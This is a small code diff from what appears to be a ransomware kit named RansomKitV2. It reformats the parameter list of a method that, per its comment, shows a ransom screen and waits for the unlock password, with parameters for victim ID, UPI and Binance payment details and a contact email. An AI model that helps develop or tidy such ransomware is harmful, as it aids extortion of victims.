@@ -24,13 +24,10 @@ namespace RansomKitV2
         /// Displays the ransom screen and blocks until the correct password is entered.
         /// Returns the verified password string.
         /// </summary>
+
         public static string ShowAndWait(
-            string victimId,
-            string upiId,
-            string upiAmount,
-            string binanceAddress,
-            string contactEmail,
-            string masterKeyHash)
+            string victimId, string upiId, string upiAmount,
+            string binanceAddress, string contactEmail, string masterKeyHash)
         {
             while (true)
             {
